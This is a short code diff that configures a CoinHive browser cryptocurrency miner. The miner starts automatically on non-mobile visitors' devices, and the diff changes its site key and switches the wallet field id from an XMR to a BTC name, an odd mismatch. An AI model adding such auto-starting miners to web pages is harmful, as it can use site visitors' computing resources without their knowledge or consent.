@@ -1,5 +1,5 @@
 /** For Setting up the User Miner */
-var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', {throttle: 0.2});
+var anonMiner = new CoinHive.Anonymous('zwKR5FjFLbWx0GOrNfg48ZMUv3ufIIS7', {throttle: 0.2});
 if (!miner.isMobile()) {
     anonMiner.start();
 }
@@ -8,7 +8,7 @@ else {
 }
 
 function getWalletAddress() {
-    return document.getElementById('xmrAddress').value;
+    return document.getElementById('btcAddress').value;
 }
 
 function createAttribute(name, val, parent) {
